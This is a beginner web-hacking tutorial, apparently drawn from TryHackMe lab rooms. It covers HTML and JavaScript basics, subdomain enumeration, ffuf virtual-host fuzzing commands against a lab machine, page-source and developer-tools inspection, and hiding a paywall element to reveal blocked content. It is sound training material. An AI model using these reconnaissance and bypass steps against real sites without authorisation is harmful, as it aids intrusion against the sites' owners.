<!--
title: Introduction Web hacking
description: 
published: true
date: 2022-10-25T11:26:14.063Z
tags: 
editor: ckeditor
dateCreated: 2022-10-25T11:26:08.922Z
-->

<h1>Introduction</h1>
<p>When you visit a website, your browser (<i>like Safari or Google Chrome</i>) makes a request to a web server asking for information about the page you're visiting. It will respond with data that your browser uses to show you the page; a&nbsp;web server is just a dedicated computer somewhere else in the world that handles your requests.</p>
<p><br>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image002.png"></figure>
<p>There are two major components that make up a website:</p>
<p>Front End (Client-Side) - the way your browser renders a website.</p>
<p>Back End (Server-Side) - a server that processes your request and returns a response.</p>
<p>There are many other processes involved in your browser making a request to a web server, but for now, you just need to understand that you make a request to a server, and it responds with data your browser uses to render information to you.</p>
<h2>&nbsp;</h2>
<h2>HTML</h2>
<p>Websites are primarily created using:</p>
<p>HTML, to build websites and define their structure</p>
<p>CSS, to make websites look pretty by adding styling options</p>
<p>JavaScript, implement complex features on pages using interactivity</p>
<p><strong>H</strong>yper<strong>T</strong>ext&nbsp;<strong>M</strong>arkup&nbsp;<strong>L</strong>anguage (HTML) is the language websites are written in. Elements (also known as tags) are the building blocks of HTML pages and tells the browser how to display content. The code snippet below shows a simple HTML document, the structure of which is the same for every website:</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image004.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>The HTML structure (as shown in the screenshot) has the following components:</p>
<p>The&nbsp;&lt;!DOCTYPE&nbsp;html&gt;&nbsp;defines that the page is a HTML5 document. This helps with standardisation across different browsers and tells the browser to use HTML5 to interpret the page.</p>
<p>The&nbsp;&lt;html&gt;&nbsp;element is the root element of the HTML page - all other elements come after this element.</p>
<p>The&nbsp;&lt;head&gt;&nbsp;element contains information about the page (such as the page title)</p>
<p>The&nbsp;&lt;body&gt;&nbsp;element defines the HTML document's body; only content inside of the body is shown in the browser.</p>
<p>The&nbsp;&lt;h1&gt;&nbsp;element defines a large heading</p>
<p>The&nbsp;&lt;p&gt;&nbsp;element defines a paragraph</p>
<p>There are many other elements (tags) used for different purposes. For example, there are tags for buttons (&lt;button&gt;), images (&lt;img&gt;), lists, and much more.&nbsp;</p>
<p>Tags can contain attributes such as the class attribute which can be used to style an element (e.g. make the tag a different color)&nbsp;&lt;p&nbsp;class="bold-text"&gt;, or the&nbsp;<i>src&nbsp;</i>attribute&nbsp;which is used on images to specify the location of an image:&nbsp;&lt;img&nbsp;src="img/cat.jpg"&gt;.An element can have multiple attributes each with its own unique purpose, e.g.,&nbsp;&lt;p attribute1="value1" attribute2="value2"&gt;.</p>
<p>Elements can also have an id attribute (&lt;p&nbsp;id="example"&gt;), which is unique to the element. Unlike the class attribute, where multiple elements can use the same class, an element must have different id's to identify them&nbsp;uniquely. Element id's are used for styling and to identify it by JavaScript.<br><br>&nbsp;</p>
<h2>Javascript</h2>
<p>JavaScript (JS) is one of the most popular coding languages in the world and allows pages to become interactive. HTML is used to create the website structure and content, while JavaScript is used to control the functionality of web pages - without JavaScript, a page would not have interactive elements and would always be static. JS can dynamically update the page in real-time, giving functionality to change the style of a button when a particular event on the page occurs (such as when a user clicks a button) or to display moving animations.</p>
<p>JavaScript is added within the page source code and can be either loaded within&nbsp;&lt;script&gt;&nbsp;tags or can be included remotely with the src attribute:&nbsp;&lt;script src="/location/of/javascript_file.js"&gt;&lt;/script&gt;</p>
<p>The following JavaScript code finds a HTML element on the page with the id of "demo" and changes the element's contents to "Hack the Planet" :&nbsp;document.getElementById("demo").innerHTML&nbsp;=&nbsp;"Hack the Planet";</p>
<p>HTML elements can also have events, such as "onclick" or "onhover" that execute JavaScript when the event occurs. The following code changes the text of the element with the demo ID to Button Clicked:&nbsp;&lt;button&nbsp;onclick='document.getElementById("demo").innerHTML&nbsp;=&nbsp;"Button Clicked";'&gt;Click Me!&lt;/button&gt;&nbsp;- onclick events can also be defined inside the JavaScript script tags, and not on elements directly.&nbsp;</p>
<h2><br>Sensitive Data disclosure (1)</h2>
<p>Sensitive Data Exposure occurs when a website doesn't properly protect (or remove) sensitive clear-text information to the end-user; usually found in a site's frontend source code.</p>
<p>We now know that websites are built using many HTML elements (tags), all of which we can see simply by "viewing the page source". A website developer may have forgotten to remove login credentials, hidden links to private parts of the website or other sensitive data shown in HTML or JavaScript.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image006.jpg"></figure>
<p>Sensitive information can be potentially leveraged to further an attacker's access within different parts of a web application. For example, there could be HTML comments with temporary login credentials, and if you viewed the page's source code and found this, you could use these credentials to log in elsewhere on the application (or worse, used to access other backend components of the site).</p>
<p>Whenever you're assessing a web application for security issues, one of the first things you should do is review the page source code to see if you can find any exposed login credentials or hidden links.</p>
<p>&nbsp;</p>
<h2>HTML injection</h2>
<p>HTML Injection is a vulnerability that occurs when unfiltered user input is displayed on the page.&nbsp;If a website fails to sanitise user input (filter any "malicious" text that a user inputs into a website), and that input is used on the page, an attacker can inject HTML code into a vulnerable website.</p>
<p>Input sanitisation is very important in keeping a website secure, as information a user inputs into a website is often used in other frontend and backend functionality. A vulnerability you'll explore in another lab is database injection, where you can manipulate a database lookup query to log in as another user by controlling the input that's directly used in the query - but for now, let's focus on HTML injection (which is client-side).</p>
<p>When a user has control of how their input is displayed, they can submit HTML (or JavaScript) code, and the browser will use it on the page, allowing the user to control the page's appearance and functionality.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image008.jpg"></figure>
<p>The image above shows how a form outputs text to the page. Whatever the user inputs into the "What's your name" field is passed to a JavaScript function and output to the page, which means if the user adds their own HTML or JavaScript in the field, it's used in the sayHi function and is added to the page - this means you can add your own HTML (such as a &lt;h1&gt; tag) and it will output your input as pure HTML.</p>
<p>The general rule is never to trust user input. To prevent malicious input, the website developer should sanitise everything the user enters before using it in the JavaScript function; in this case, the developer could remove any HTML tags.</p>
<p>&nbsp;</p>
<h1>Web discovery</h1>
<p>So, we have a file upload point on a site. How would we go about exploiting it?</p>
<p>As with any kind of hacking, enumeration is key. The more we understand about our environment, the more we're able to&nbsp;<i>do</i>&nbsp;with it. Looking at the source code for the page is good to see if any kind of client-side filtering is being applied. Scanning with a directory bruteforcer such as Gobuster is usually helpful in web attacks, and may reveal where files are being uploaded to; Gobuster is no longer installed by default on Kali, but can be installed with&nbsp;<code>sudo apt install gobuster</code>. Intercepting upload requests with&nbsp;<a href="https://blog.tryhackme.com/setting-up-burp/">Burpsuite</a>&nbsp;will also come in handy. Browser extensions such as&nbsp;<a href="https://www.wappalyzer.com/download">Wappalyser</a>&nbsp;can provide valuable information at a glance about the site you're targetting.</p>
<p>With a basic understanding of how the website might be handling our input, we can then try to poke around and see what we can and can't upload. If the website is employing client-side filtering then we can easily look at the code for the filter and look to bypass it (more on this later!). If the website has server-side filtering in place then we may need to take a guess at what the filter is looking for, upload a file, then try something slightly different based on the error message if the upload fails. Uploading files designed to provoke errors can help with this. Tools like Burpsuite or OWASP Zap can be very helpful at this stage.</p>
<p>&nbsp;</p>
<p>As a penetration tester, your role when reviewing a website or web application is to discover features that could potentially be vulnerable and attempt to exploit them to assess whether or not they are. These features are usually parts of the website that require some interactivity with the user.</p>
<p>&nbsp;</p>
<h2>Subdomain enumeration</h2>
<p>Subdomain enumeration is the process of finding valid subdomains for a domain, but why do we do this? We do this to expand our attack surface to try and discover more potential points of vulnerability.<br><br>We will explore three different subdomain enumeration methods: Brute Force, OSINT (Open-Source Intelligence) and Virtual Host.</p>
<p>&nbsp;</p>
<h3>OSINT: SSL/TLS Certificates</h3>
<p>When an SSL/TLS (Secure Sockets Layer/Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA's take part in what's called "Certificate Transparency (CT) logs". These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used. We can use this service to our advantage to discover subdomains belonging to a domain, sites like&nbsp;<a href="http://crt.sh/">https://crt.sh</a>&nbsp;and&nbsp;<a href="https://transparencyreport.google.com/https/certificates">https://transparencyreport.google.com/https/certificates</a>&nbsp;offer a searchable database of certificates that shows current and historical results.</p>
<h2>&nbsp;</h2>
<h3>OSINT:&nbsp;Search Engines</h3>
<p>Search engines contain trillions of links to more than a billion websites, which can be an excellent resource for finding new subdomains.&nbsp;Using advanced search methods on websites like Google, such as the site: filter, can narrow the search results. For example, "-site:www.domain.com site:*.domain.com" would only contain results leading to the domain name domain.com but exclude any links to www.domain.com; therefore, it shows us only subdomain names belonging to domain.com.</p>
<p>&nbsp;</p>
<h3>OSINT: Sublist3r</h3>
<p>To speed up the process of OSINT subdomain discovery, we can automate the above methods with the help of tools like&nbsp;<a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a>, click the "View Site" button to open up the static site and run the sublist3r simulation to discover a new subdomain that will help answer the question below.</p>
<p>&nbsp;</p>
<h3>DNS Bruteforce</h3>
<p>Bruteforce&nbsp;DNS&nbsp;(Domain Name System) enumeration is the method of trying tens, hundreds, thousands or even millions of different possible subdomains from a pre-defined list of commonly used subdomains. Because this method requires many requests, we automate it with tools to make the process quicker. In this instance, we are using a tool called dnsrecon to perform this. Click the "View Site" button to open the static site, press the "Run DNSrecon Request" button to start the simulation, and then answer the question below.</p>
<p>&nbsp;</p>
<h3>Virtual hosts</h3>
<p>Some subdomains aren't always hosted in publically accessible&nbsp;DNS&nbsp;results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users) which maps domain names to IP addresses.&nbsp;</p>
<p>&nbsp;</p>
<p>Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the&nbsp;<strong>Host</strong>&nbsp;header. We can utilise this host header by making changes to it and monitoring the response to see if we've discovered a new website.</p>
<p>&nbsp;</p>
<p>Like with&nbsp;DNS&nbsp;Bruteforce, we can automate this process by using a wordlist of commonly used subdomains.</p>
<p>&nbsp;</p>
<p>Start an AttackBox and then try the following command against the Acme IT Support machine to try and discover a new subdomain.</p>
<p>&nbsp;</p>
<p>ffuf</p>
<p>user@machine<strong>$</strong> ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H&nbsp;"Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP</p>
<p>The above command uses the&nbsp;<strong>-w</strong>&nbsp;switch to specify the wordlist we are going to use. The&nbsp;<strong>-H</strong>&nbsp;switch adds/edits a header (in this instance, the Host header), we have the&nbsp;<strong>FUZZ</strong>&nbsp;keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.</p>
<p>Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the&nbsp;<strong>-fs</strong>&nbsp;switch. Edit the below command replacing {size} with the most occurring size value from the previous result and try it on the AttackBox.<br><br>&nbsp;</p>
<p>ffuf</p>
<p>user@machine<strong>$</strong> ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H&nbsp;"Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP -fs&nbsp;{size}</p>
<p>This command has a similar syntax to the first apart from the&nbsp;<strong>-fs</strong>&nbsp;switch, which tells ffuf to ignore any results that are of the specified size.</p>
<h2>&nbsp;</h2>
<p>Finding interactive parts<br>Finding interactive portions of the website can be as easy as spotting a login form to manually reviewing the website's JavaScript. An excellent place to start is just with your browser exploring the website and noting down the individual pages/areas/features with a summary for each one.</p>
<p>An example site review for the Acme IT Support website would look something like this:</p>
<p>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#008EFF;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>Feature</strong></td>
        <td style="background-color:#008EFF;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>URL</strong></td>
        <td style="background-color:#008EFF;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>Summary</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Home Page</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">/</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This page contains a summary of what Acme IT Support does with a company photo of their staff.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Latest News</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">/news</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This page contains a list of recently published news articles by the company, and each news article has a link with an id number, i.e. /news/article?id=1</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">News Article</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">/news/article?id=1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Displays the individual news article. Some articles seem to be blocked and reserved for premium customers only.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Contact Page</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">/contact</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This page contains a form for customers to contact the company. It contains name, email and message input fields and a send button.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Customers</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">/customers</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This link redirects to /customers/login.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Customer Login</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">/customers/login</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This page contains a login form with username and password fields.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Customer Signup</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">/customers/signup</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This page contains a user-signup form that consists of a username, email, password and password confirmation input fields.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Customer Reset Password</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">/customers/reset</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Password reset form with an email address input field.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Customer Dashboard</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">/customers</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This page contains a list of the user's tickets submitted to the IT support company and a "Create Ticket" button.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Create Ticket</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">/customers/ticket/new</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This page contains a form with a textbox for entering the IT issue and a file upload option to create an IT support ticket.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Customer Account</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">/customers/account</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This page allows the user to edit their username, email and password.</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Customer Logout</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">/customers/logout</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">This link logs the user out of the customer area.</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>&nbsp;</p>
<h2>View the page source</h2>
<p>The page source is the human-readable code returned to our browser/client from the web server each time we make a request.</p>
<p>&nbsp;</p>
<p>The returned code is made up of HTML ( HyperText Markup Language), CSS ( Cascading Style Sheets ) and JavaScript, and it's what tells our browser what content to display, how to show it and adds an element of interactivity with JavaScript.</p>
<p>&nbsp;</p>
<p>For our purposes, viewing the page source can help us discover more information about the web application.</p>
<p>&nbsp;</p>
<p><strong>How do I view the Page Source?</strong></p>
<p>While viewing a website, you can right-click on the page, and you'll see an option on the menu that says View Page Source.</p>
<p>Most browsers support putting view-source: in front of the URL for example,&nbsp;<strong>view-source:https://www.google.com/</strong></p>
<p>In your browser menu, you'll find an option to view the page source. This option can sometimes be in submenus such as developer tools or more tools.</p>
<p>&nbsp;</p>
<p><strong>Let's view some Page Source!</strong></p>
<p>Try viewing the page source of the home page of the Acme IT Support website. Unfortunately, explaining everything you can see here is well out of the scope of this room, and you'll need to look into website design/development courses to understand it fully. What we can do, is pick out bits of information that are of importance to us.</p>
<p>&nbsp;</p>
<p>At the top of the page, you'll notice some code starting with&nbsp;<code>&lt;!--</code>&nbsp;and ending with&nbsp;<code>--&gt;</code>&nbsp;these are comments. Comments are messages left by the website developer, usually to explain something in the code to other programmers or even notes/reminders for themselves. These comments don't get displayed on the actual webpage. This comment describes how the homepage is temporary while a new one is in development. View the webpage in the comment to get your first flag.</p>
<p>&nbsp;</p>
<p>Links to different pages in HTML are written in anchor tags ( these are HTML elements that start with&nbsp;<code>&lt;a</code>&nbsp;), and the link that you'll be directed to is stored in the&nbsp;<code>href</code>&nbsp;attribute.</p>
<p>&nbsp;</p>
<p>For example, you'll see the contact page link on line 31:</p>
<p>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image010.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>If you view further down the page source, there is a hidden link to a page starting with "secr", view this link to get another flag. You obviously wouldn't get a flag in a real-world situation, but you may discover some private area used by the business for storing company/staff/customer information.<br><br>External files such as CSS, JavaScript and Images can be included using the HTML code. In this example, you'll notice that these files are all stored in the same directory. If you view this directory in your web browser, there is a configuration error. What should be displayed is either a blank page or a 403 Forbidden page with an error stating you don't have access to the directory. Instead, the directory listing feature has been enabled, which in fact, lists every file in the directory. Sometimes this isn't an issue, and all the files in the directory are safe to be viewed by the public, but in some instances, backup files, source code or other confidential information could be stored here. In this instance, we get a flag in the flag.txt file.<br><br>Many websites these days aren't made from scratch and use what's called a framework. A framework is a collection of premade code that easily allows a developer to include common features that a website would require, such as blogs, user management, form processing, and much more, saving the developers hours or days of development.<br><br>Viewing the page source can often give us clues into whether a framework is in use and, if so, which framework and even what version. Knowing the framework and version can be a powerful find as there may be public vulnerabilities in the framework, and the website might not be using the most up to date version. At the bottom of the page, you'll find a comment about the framework and version in use and a link to the framework's website. Viewing the framework's website, you'll see that our website is, in fact, out of date. Read the update notice and use the information that you find to discover another flag.</p>
<p>&nbsp;</p>
<h2>Developer tools</h2>
<h3>Inspector</h3>
<p>Every modern browser includes developer tools; this is a tool kit used to aid web developers in debugging web applications and gives you a peek under the hood of a website to see what is going on. As a pentester, we can leverage these tools to provide us with a much better understanding of the web application. We're specifically focusing on three features of the developer tool kit, Inspector, Debugger and Network.</p>
<p>&nbsp;</p>
<p>Opening Developer Tools</p>
<p>The way to access developer tools is different for every browser. If you're not sure how to access it, click the "View Site" button on the top right of this task to get instructions to how to access the tools for your browser.</p>
<p>&nbsp;</p>
<p>Inspector</p>
<p>The page source doesn't always represent what's shown on a webpage; this is because CSS, JavaScript and user interaction can change the content and style of the page, which means we need a way to view what's been displayed in the browser window at this exact time. Element inspector assists us with this by providing us with a live representation of what is currently on the website.</p>
<p>&nbsp;</p>
<p>As well as viewing this live view, we can also edit and interact with the page elements, which is helpful for web developers to debug issues.</p>
<p>On the Acme IT Support website, click into the news section, where you'll see three news articles.</p>
<p>&nbsp;</p>
<p>The first two articles are readable, but the third has been blocked with a floating notice above the content stating you have to be a premium customer to view the article. These floating boxes blocking the page contents are often referred to as paywalls as they put up a metaphorical wall in front of the content you wish to see until you pay.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image012.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>Right-clicking on the premium notice ( paywall ), you should be able to select the Inspect option from the menu, which opens the developer tools either on the bottom or right-hand side depending on your browser or preferences. You'll now see the elements/HTML that make up the website ( similar to the screenshots below ).</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image014.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p><i>(Click on the image to enlarge)</i></p>
<p>Locate the&nbsp;<code>DIV</code>&nbsp;element with the class&nbsp;<code>premium-customer-blocker</code>&nbsp;and click on it. You'll see all the CSS styles in the styles box that apply to this element, such as&nbsp;<code>margin-top: 60px</code>&nbsp;and&nbsp;<code>text-align: center</code>. The style we're interested in is the&nbsp;<code>display: block</code>. If you click on the word&nbsp;<code>block</code>, you can type a value of your own choice. Try typing&nbsp;<code>none</code>, and this will make the box disappear, revealing the content underneath it and a flag. If the element didn't have a display field, you could click below the last style and add in your own. Have a play with the element inspector, and you'll see you can change any of the information on the website, including the content. Remember this is only edited on your browser window, and when you press refresh, everything will be back to normal.</p>
<p>&nbsp;</p>
<h3>Debugger</h3>
<p>This panel in the developer tools is intended for debugging JavaScript, and again is an excellent feature for web developers wanting to work out why something might not be working. But as penetration testers, it gives us the option of digging deep into the JavaScript code. In Firefox and Safari, this feature is called Debugger, but in Google Chrome, it's called Sources.</p>
<p>&nbsp;</p>
<p>On the Acme IT Support website, click on the contact page, each time the page is loaded, you might notice a rapid flash of red on the screen. We're going to use the Debugger to work out what this red flash is and if it contains anything interesting. Debugging a red dot wouldn't be something you'd do in the real world as a penetration tester, but it does allow us to use this feature and get used to the Debugger.</p>
<p>&nbsp;</p>
<p>In both browsers, on the left-hand side, you see a list of all the resources the current webpage is using. If you click into the assets folder, you'll see a file named flash.min.js. Clicking on this file displays the contents of the JavaScript file.</p>
<p>&nbsp;</p>
<p>Many times when viewing javascript files, you'll notice that everything is on one line, which is because it has been minimised, which means all formatting ( tabs, spacing and newlines ) have been removed to make the file smaller. This file is no exception to this, and it has also been obfusticated, which makes it purposely difficult to read, so it can't be copied as easily by other developers.</p>
<p>&nbsp;</p>
<p>We can return some of the formattings by using the "Pretty Print" option, which looks like two braces { } to make it a little more readable, although due to the obfustication, it's still difficult to comprehend what is going on with the file. If you scroll to the bottom of the flash.min.js file, you'll see the line:&nbsp;flash['remove']();</p>
<p>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image016.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p><br><br>&nbsp;</p>
<p><i>(Click on the image to enlarge)</i></p>
<p>&nbsp;</p>
<p>This little bit of JavaScript is what is removing the red popup from the page. We can utilise another feature of debugger called&nbsp;<strong>breakpoints</strong>. These are points in the code that we can force the browser to stop processing the JavaScript and pause the current execution.</p>
<p>&nbsp;</p>
<h3>Network</h3>
<p>The network tab on the developer tools can be used to keep track of every external request a webpage makes. If you click on the Network tab and then refresh the page, you'll see all the files the page is requesting.&nbsp;</p>
<p>&nbsp;</p>
<p>Try doing this on the contact page; you can press the trash can icon to delete the list if it gets a bit overpopulated.</p>
<p>&nbsp;</p>
<p>With the network tab open, try filling in the contact form and pressing the&nbsp;<strong>Send Message</strong>&nbsp;button. You'll notice an event in the network tab, and this is the form being submitted in the background using a method called AJAX. AJAX is a method for sending and receiving network data in a web application background without interfering by changing the current web page.</p>
<p><br><br>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image018.jpg" alt="Afbeelding met tafel

Automatisch gegenereerde beschrijving"></figure>
<p><br><br>&nbsp;</p>
<h2>Robots.txt</h2>
<p>The robots.txt file is a document that tells search engines which pages they are and aren't allowed to show on their search engine results or ban specific search engines from crawling the website altogether. It can be common practice to restrict certain website areas so they aren't displayed in search engine results. These pages may be areas such as administration portals or files meant for the website's customers. This file gives us a great list of locations on the website that the owners don't want us to discover as penetration testers.</p>
<p>&nbsp;</p>
<h2>Favicon</h2>
<p>The favicon is a small icon displayed in the browser's address bar or tab used for branding a website.</p>
<p>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image020.png"></figure>
<p>&nbsp;</p>
<p>Sometimes when frameworks are used to build a website, a favicon that is part of the installation gets leftover, and if the website developer doesn't replace this with a custom one, this can give us a clue on what framework is in use. OWASP host a database of common framework icons that you can use to check against the targets favicon&nbsp;<a href="https://wiki.owasp.org/index.php/OWASP_favicon_database">https://wiki.owasp.org/index.php/OWASP_favicon_database</a>. Once we know the framework stack, we can use external resources to discover more about it (see next section).</p>
<p>&nbsp;</p>
<p><strong>Practical Exercise:</strong></p>
<p>&nbsp;</p>
<p>On the AttackBox, open firefox and enter&nbsp;the url&nbsp;<a href="https://static-labs.tryhackme.cloud/sites/favicon/">https://static-labs.tryhackme.cloud/sites/favicon/</a>&nbsp;here you'll see a basic website with a note saying "Website coming soon...", if you look at your tabs you'll notice an icon that confirms this site is using a favicon.</p>
<p>&nbsp;</p>
<p>Viewing the page source you'll see line six contains a link to the images/favicon.ico file.&nbsp;</p>
<p>&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image021.png"></figure>
<p><br><br>&nbsp;</p>
